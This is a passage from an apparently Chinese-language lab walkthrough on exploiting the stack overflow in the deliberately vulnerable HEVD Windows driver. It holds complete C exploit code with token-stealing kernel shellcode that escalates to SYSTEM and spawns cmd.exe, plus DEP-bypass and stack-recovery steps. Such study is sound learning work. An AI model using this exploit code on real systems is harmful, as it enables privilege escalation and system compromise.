                0x408b0000,
                0xbac18950,
                0x4,
                0x00b8808b,
                0xb82d0000,
                0x39000000,
                0x0000b490,
                0x8bed7500,
                0x0000f890,
                0xf8918900,
                0x61000000,
            };
            DWORD dwInBufferSize = 2080 + 4;
            UCHAR* pInBuffer = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwInBufferSize * sizeof(UCHAR));
            if (pInBuffer == NULL)
            {
                handle_error("HeapAlloc", GetLastError());
                break;
            }
            RtlFillMemory(pInBuffer, 2080, 0x41);
            PVOID pShellcode = &ulShellcode;
            PVOID *ppShellcode = &pShellcode;
            RtlCopyMemory(pInBuffer + 2080, ppShellcode, 4);
            DWORD dwReturnedBytes = 0;
            if (!DeviceIoControl(hDevice, 0x222003, (LPVOID)pInBuffer, dwInBufferSize, NULL, 0, &dwReturnedBytes, NULL))
            {
                handle_error("DeviceIoControl failed!\n", GetLastError());
                break;
            }
            else
            {
                printf("DeviceIoControl successfully.\n");
                system("cmd.exe");
            }
            if (pInBuffer != NULL)
                HeapFree(GetProcessHeap(), 0, pInBuffer);
        } while (0);
    }
中间忘了栈上存在`DEP`的问题，从而没有开辟空间直接执行，`DEP`导致执行失败，可以验证一下试试，在函数`return`前设置断点`bp
HEVD+0x4527e`
没有执行权限，发生了异常。
使用`VirtualAlloc`重新分配可执行内存
    void exp()
    {
        do {
            HANDLE hDevice;
            hDevice = CreateFileA(
                /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
                /* DWORD dwDesiredAccess */ 0xC0000000,
                /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
                /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
                /* DWORD dwCreationDisposition */ OPEN_EXISTING,
                /* DWORD dwFlagsAndAttributes */ 0,
                /* HANDLE hTemplateFile */ NULL);
            if (hDevice == INVALID_HANDLE_VALUE)
            {
                handle_error("Open device failed!\n", GetLastError());
                break;
            }
            ULONG ulShellcode[] = {
                0x64c03160,
                0x0124808b,
                0x408b0000,
                0xbac18950,
                0x4,
                0x00b8808b,
                0xb82d0000,
                0x39000000,
                0x0000b490,
                0x8bed7500,
                0x0000f890,
                0xf8918900,
                0x61000000,
            };
            PVOID pEopPayload = VirtualAlloc(NULL, sizeof(ulShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (pEopPayload == NULL)
            {
                handle_error("VirtualAlloc", GetLastError());
                break;
            }
            RtlCopyMemory(pEopPayload, ulShellcode, sizeof(ulShellcode));
            DWORD dwInBufferSize = 2080 + 4;
            UCHAR* pInBuffer = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwInBufferSize * sizeof(UCHAR));
            if (pInBuffer == NULL)
            {
                handle_error("HeapAlloc", GetLastError());
                break;
            }
            RtlFillMemory(pInBuffer, 2080, 0x41);
            PVOID pShellcode = &pEopPayload;
            PVOID *ppShellcode = &pEopPayload;
            RtlCopyMemory(pInBuffer + 2080, ppShellcode, 4);
            DWORD dwReturnedBytes = 0;
            if (!DeviceIoControl(hDevice, 0x222003, (LPVOID)pInBuffer, dwInBufferSize, NULL, 0, &dwReturnedBytes, NULL))
            {
                handle_error("DeviceIoControl failed!\n", GetLastError());
                break;
            }
            else
            {
                printf("DeviceIoControl successfully.\n");
                system("cmd.exe");
            }
            if (pInBuffer != NULL)
                HeapFree(GetProcessHeap(), 0, pInBuffer);
            if (pEopPayload != NULL)
                VirtualFree(pEopPayload, sizeof(ulShellcode), MEM_RELEASE);
        } while (0);
    }
重启继续
可以发现，再次出错了，出错的原因在于执行完我们的`shellcode`之后，我们没有对环境进行复原  
那么我们来分析一下如何复原现在这个环境，这个得仔细思考，没有想象中的那么想当然，我们最好从原理上搞懂，为什么这么做。首先分析一下，如果栈没有溢出，正常执行完`popad`，我们应该执行的指令
    PAGE:933F6263                 add     esp, 10h
    PAGE:933F6266
    PAGE:933F6266 loc_933F6266:                           ; CODE XREF: TriggerBufferOverflowStack+9B↑j
    PAGE:933F6266                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
    PAGE:933F626D                 mov     eax, edi
    PAGE:933F626F                 mov     ecx, [ebp+ms_exc.registration.Next]
    PAGE:933F6272                 mov     large fs:0, ecx
    PAGE:933F6279                 pop     ecx
    PAGE:933F627A                 pop     edi
    PAGE:933F627B                 pop     esi
    PAGE:933F627C                 pop     ebx
    PAGE:933F627D                 leave
    PAGE:933F627E                 retn    8  ; 这里跳转到shellcode
    PAGE:933F627E TriggerBufferOverflowStack endp
`shellcode`执行完后，正常应该跳出`TriggerBufferOverflowStack`，回到`BufferOverflowStackIoctlHandler`函数
    PAGE:933F617E BufferOverflowStackIoctlHandler proc near
    PAGE:933F617E                                         ; CODE XREF: IrpDeviceIoCtlHandler+51↑p
    PAGE:933F617E
    PAGE:933F617E arg_4           = dword ptr  0Ch
    PAGE:933F617E
    PAGE:933F617E                 push    ebp
    PAGE:933F617F                 mov     ebp, esp
    PAGE:933F6181                 mov     eax, [ebp+arg_4]
    PAGE:933F6184                 mov     ecx, 0C0000001h
    PAGE:933F6189                 mov     edx, [eax+10h]
    PAGE:933F618C                 mov     eax, [eax+8]
    PAGE:933F618F                 test    edx, edx
    PAGE:933F6191                 jz      short loc_933F619C
    PAGE:933F6193                 push    eax             ; MaxCount
    PAGE:933F6194                 push    edx             ; Address
    PAGE:933F6195                 call    TriggerBufferOverflowStack
    PAGE:933F619A                 mov     ecx, eax  ; shellcode 执行完，应该从这里开始执行
    PAGE:933F619C
    PAGE:933F619C loc_933F619C:                           ; CODE XREF: BufferOverflowStackIoctlHandler+13↑j
    PAGE:933F619C                 mov     eax, ecx
    PAGE:933F619E                 pop     ebp
    PAGE:933F619F                 retn    8
    PAGE:933F619F BufferOverflowStackIoctlHandler endp
看一下汇编指令
    mov ecx, eax
    mov eax, ecx
    pop ebp
    retn 8
可以发现`eax`是作为返回值使用的，成功执行`eax`应该是`0`，所以简化指令
    xor eax, eax
    pop ebp
    ret 8
讲汇编指令转化为二进制数据
将环境复原指令添加到`shellcode`中
    ULONG ulShellcode[] = {
        0x64c03160,
        0x0124808b,
        0x408b0000,
        0xbac18950,
        0x4,
        0x00b8808b,
        0xb82d0000,
        0x39000000,
        0x0000b490,
        0x8bed7500,
        0x0000f890,
        0xf8918900,
        0x61000000,
        0xc25dc031,
        0x8};
在上次那个断点断下，并逐步调试
继续，成功跳出